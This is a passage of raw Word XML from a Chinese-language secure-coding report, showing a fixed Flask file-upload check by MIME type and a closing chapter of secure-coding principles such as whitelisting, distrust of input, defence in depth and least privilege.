        <w:t xml:space="preserve">        f.save(save_path)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # ✅ MIME验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">        mime_type = magic.from_file(save_path, mime=True)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if not mime_type.startswith("image/"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            os.remove(save_path)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return render_template("upload_fixed.html", upload_msg="文件内容不合法")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第九章  安全编码规范总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则一：白名单机制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>始终用白名单（明确允许什么）而非黑名单。明确只允许.jpg/.png等图片后缀，而不是禁止.php/.asp。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则二：输入不可信</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用户提交的任何数据都不可信，必须严格验证。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则三：纵深防御</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>不要依赖单一防御。后缀检查+MIME检测+UUID重命名+目录权限控制，多层防护。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则四：最小权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Web进程不以root运行。上传目录禁执行脚本。数据库用专有账号。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原则五：安全默认</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>框架安全特性默认开启，敏感信息不硬编码。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>—— 报告结束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